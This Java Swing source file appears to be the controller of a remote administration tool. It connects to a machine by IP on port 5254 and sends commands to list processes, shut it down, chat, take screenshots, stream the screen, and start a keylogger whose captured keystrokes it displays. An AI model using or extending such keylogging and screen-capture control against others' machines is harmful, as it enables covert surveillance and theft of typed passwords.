    package View.Admin;

    import javax.swing.*;
    import java.awt.*;
    import java.awt.event.ActionEvent;
    import java.awt.event.ActionListener;
    import java.awt.image.BufferedImage;
    import java.io.BufferedReader;
    import java.io.ByteArrayInputStream;
    import java.io.IOException;
    import java.io.InputStreamReader;
    import java.io.PrintWriter;
    import java.net.Socket;
    import java.util.Base64;

    public class Admin extends JFrame {
        private JTextField ipTextField;
        private JButton connectButton;
        private JButton runningProcessesButton;
        private JButton runningApplicationsButton;
        private JButton keyStrokeButton;
        private JButton shutDownButton;
        private JButton displayButton;
        private JButton printScreenshotButton;
        private JButton getInfoButton;
        private JButton exitButton;
        private JLabel errorLabel;
        private JTextArea chatArea;
        private JTextField chatInputField;
        private JButton sendChatButton;

        private Socket socket;
        private PrintWriter out;
        private BufferedReader in;
        private Thread responseReaderThread;
        private DisplayInfo displayInfo;
        private KeyloggerForm keyloggerForm;

        public Admin() {
            setTitle("Admin Client");
            setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            setSize(500, 600);
            setLayout(new GridBagLayout());
            initializeComponents();
            addEventListeners();
            setVisible(true);
        }

        private void initializeComponents() {
            GridBagConstraints gbc = new GridBagConstraints();
            gbc.fill = GridBagConstraints.HORIZONTAL;
            gbc.insets = new Insets(5, 5, 5, 5);

            ipTextField = new JTextField();
            connectButton = new JButton("Connect");
            runningProcessesButton = new JButton("Running Processes");
            runningApplicationsButton = new JButton("Running Applications");
            keyStrokeButton = new JButton("KeyStroke");
            shutDownButton = new JButton("Shut down");
            displayButton = new JButton("Display");
            printScreenshotButton = new JButton("Print screenshot");
            getInfoButton = new JButton("Get info");
            exitButton = new JButton("Exit");
            errorLabel = new JLabel();
            errorLabel.setForeground(Color.RED);

            Dimension buttonSize = new Dimension(140, 30);
            connectButton.setPreferredSize(buttonSize);
            runningProcessesButton.setPreferredSize(buttonSize);
            runningApplicationsButton.setPreferredSize(buttonSize);
            keyStrokeButton.setPreferredSize(buttonSize);
            shutDownButton.setPreferredSize(buttonSize);
            displayButton.setPreferredSize(buttonSize);
            printScreenshotButton.setPreferredSize(buttonSize);
            getInfoButton.setPreferredSize(buttonSize);
            exitButton.setPreferredSize(buttonSize);

            gbc.gridx = 0;
            gbc.gridy = 0;
            gbc.gridwidth = 3;
            add(new JLabel("Enter IP:"), gbc);

            gbc.gridx = 0;
            gbc.gridy = 1;
            gbc.gridwidth = 2;
            add(ipTextField, gbc);

            gbc.gridx = 2;
            gbc.gridy = 1;
            gbc.gridwidth = 1;
            add(connectButton, gbc);

            gbc.gridx = 0;
            gbc.gridy = 2;
            gbc.gridwidth = 1;
            add(runningProcessesButton, gbc);

            gbc.gridx = 1;
            gbc.gridy = 2;
            add(runningApplicationsButton, gbc);

            gbc.gridx = 2;
            gbc.gridy = 2;
            add(keyStrokeButton, gbc);

            gbc.gridx = 0;
            gbc.gridy = 3;
            add(shutDownButton, gbc);

            gbc.gridx = 1;
            gbc.gridy = 3;
            add(displayButton, gbc);

            gbc.gridx = 2;
            gbc.gridy = 3;
            add(printScreenshotButton, gbc);

            gbc.gridx = 0;
            gbc.gridy = 4;
            add(getInfoButton, gbc);

            gbc.gridx = 1;
            gbc.gridy = 4;
            add(exitButton, gbc);

            gbc.gridx = 0;
            gbc.gridy = 5;
            gbc.gridwidth = 3;
            add(errorLabel, gbc);

            chatArea = new JTextArea(10, 30);
            chatArea.setEditable(false);
            chatInputField = new JTextField(20);
            sendChatButton = new JButton("Send");

            gbc.gridx = 0;
            gbc.gridy = 6;
            gbc.gridwidth = 3;
            add(new JScrollPane(chatArea), gbc);

            gbc.gridx = 0;
            gbc.gridy = 7;
            gbc.gridwidth = 2;
            add(chatInputField, gbc);

            gbc.gridx = 2;
            gbc.gridy = 7;
            add(sendChatButton, gbc);
        }

        private void addEventListeners() {
            connectButton.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    ensureConnected();
                }
            });

            getInfoButton.addActionListener(e -> {
                if (ensureConnected()) {
                    sendCommand("OS_INFO");
                    new Thread(() -> {
                        try {
                            String serverResponse;
                            while ((serverResponse = in.readLine()) != null) {
                                if (serverResponse.startsWith("OS_INFO:")) {
                                    final String osinfo = serverResponse.substring("OS_INFO:".length());
                                    SwingUtilities.invokeLater(() -> {
                                        DisplayInfo displayInfo = new DisplayInfo(osinfo);
                                        displayInfo.setVisible(true);
                                    });
                                    break;
                                }
                            }
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }).start();
                }
            });

       runningApplicationsButton.addActionListener(e -> {
    
        if (ensureConnected()) {
            SwingUtilities.invokeLater(() -> {
                RunningApplicationsForm runningAppsForm = new RunningApplicationsForm(in, out);
                runningAppsForm.setVisible(true);
            });
        }
    
});


        



    keyStrokeButton.addActionListener(e -> {
        if (ensureConnected()) {
            sendCommand("STARTKEYLOGGER");
            // Initialize the form first
            SwingUtilities.invokeLater(() -> {
                KeyloggerForm keyloggerForm = new KeyloggerForm();
                keyloggerForm.setVisible(true);
            });

            // Start a thread to update the form with data
            new Thread(() -> {
                try {
                    String serverResponse;
                    while ((serverResponse = in.readLine()) != null) {
                        if (serverResponse.startsWith("KEYLOG:")) {
                            final String base64KeylogData = serverResponse.substring("KEYLOG:".length());
                            SwingUtilities.invokeLater(() -> {
                                KeyloggerForm keyloggerForm = KeyloggerForm.getCurrentInstance();
                                if (keyloggerForm != null) {
                                    keyloggerForm.updateKeylogData(base64KeylogData); // Truyền base64KeylogData vào updateKeylogData
                                }
                            });
                        }
                    }
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }).start();
        }
    });

            shutDownButton.addActionListener(e -> {
                if (ensureConnected()) {
                    ShutdownForm shutdownForm = new ShutdownForm(out);
                    shutdownForm.setVisible(true);
                } else {
                    JOptionPane.showMessageDialog(Admin.this, "Not connected to server.", "Error", JOptionPane.ERROR_MESSAGE);
                }
            });

            sendChatButton.addActionListener(e -> {
                if (ensureConnected()) {
                    String message = chatInputField.getText();
                    if (!message.isEmpty()) {
                        sendCommand("CHAT:" + message);
                        chatInputField.setText("");
                    }
                }
            });

            displayButton.addActionListener(e -> {
                if (ensureConnected()) {
                    VideoForm videoForm = new VideoForm();
                    videoForm.setVisible(true);

                    new Thread(() -> {
                        try {
                            while (videoForm.isRunning()) {
                                sendCommand("SCREENSHOT");
                                String imageData = in.readLine();
                                if (imageData != null && imageData.startsWith("SCREENSHOT:")) {
                                    String base64Image = imageData.substring("SCREENSHOT:".length());
                                    SwingUtilities.invokeLater(() -> videoForm.updateScreenshot(base64Image));
                                }
                                Thread.sleep(100); // Adjust this to control screenshot frequency
                            }
                            sendCommand("STOP_VIDEO");
                        } catch (IOException | InterruptedException ex) {
                            ex.printStackTrace();
                        }
                    }).start();
                }
            });

            printScreenshotButton.addActionListener(e -> {
                if (ensureConnected()) {
                    sendCommand("SCREENSHOT");
                    new Thread(() -> {
                        try {
                            String imageData = in.readLine();
                            if (imageData != null && imageData.startsWith("SCREENSHOT:")) {
                                String base64Image = imageData.substring("SCREENSHOT:".length());
                                BufferedImage image = decodeFromBase64(base64Image);
                                if (image != null) {
                                    SwingUtilities.invokeLater(() -> {
                                        ScreenshotForm screenshotForm = new ScreenshotForm(out, in);
                                        screenshotForm.setImage(image);
                                        screenshotForm.setVisible(true);
                                    });
                                } else {
                                    SwingUtilities.invokeLater(() -> {
                                        JOptionPane.showMessageDialog(Admin.this, "Failed to decode image.", "Error", JOptionPane.ERROR_MESSAGE);
                                    });
                                }
                            } else {
                                SwingUtilities.invokeLater(() -> {
                                    JOptionPane.showMessageDialog(Admin.this, "No valid image data received.", "Error", JOptionPane.ERROR_MESSAGE);
                                });
                            }
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }).start();
                }
            });

            exitButton.addActionListener(e -> {
                sendCommand("exit");
                closeConnections();
                System.exit(0);
            });
        }

        private boolean ensureConnected() {
        if (socket != null && socket.isConnected() && !socket.isClosed()) {
            return true;
        }
        String ip = ipTextField.getText();
        if (isValidIPv4(ip)) {
            errorLabel.setText("Connecting...");
            errorLabel.setForeground(Color.GREEN);
            try {
                socket = new Socket(ip, 5254);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                out.println("ADMIN");

                JOptionPane.showMessageDialog(Admin.this, "Connected successfully!", "Message", JOptionPane.INFORMATION_MESSAGE);
                return true;
            } catch (IOException ex) {
                errorLabel.setText("Connection failed.");
                errorLabel.setForeground(Color.RED);
            }
        } else {
            errorLabel.setText("Connection failed.");
            errorLabel.setForeground(Color.RED);
        }
        return false;
    }


        private void sendCommand(String command) {
            if (out != null) {
                out.println(command);
            } else {
                errorLabel.setText("Not connected to server.");
            }
        }

        private void closeConnections() {
            try {
                if (responseReaderThread != null && responseReaderThread.isAlive()) {
                    responseReaderThread.interrupt();
                    responseReaderThread.join();
                }
                if (in != null) {
                    in.close();
                }
                if (out != null) {
                    out.close();
                }
                if (socket != null && !socket.isClosed()) {
                    socket.close();
                }
            } catch (IOException | InterruptedException ex) {
                ex.printStackTrace();
            }
        }

        private boolean isValidIPv4(String ip) {
            String ipv4Pattern = "^(\\d{1,3}\\.){3}\\d{1,3}$";
            if (ip.matches(ipv4Pattern)) {
                String[] parts = ip.split("\\.");
                for (String part : parts) {
                    int intPart = Integer.parseInt(part);
                    if (intPart < 0 || intPart > 255) {
                        return false;
                    }
                }
                return true;
            }
            return false;
        }

        private BufferedImage decodeFromBase64(String base64Image) {
            BufferedImage image = null;
            try {
                byte[] imageBytes = Base64.getDecoder().decode(base64Image);
                ByteArrayInputStream bis = new ByteArrayInputStream(imageBytes);
                image = javax.imageio.ImageIO.read(bis);
                bis.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return image;
        }

        public void setDisplayInfo(DisplayInfo displayInfo) {
            this.displayInfo = displayInfo;
        }

        public static void main(String[] args) {
            SwingUtilities.invokeLater(() -> {
                Admin home = new Admin();
            });
        }
    }
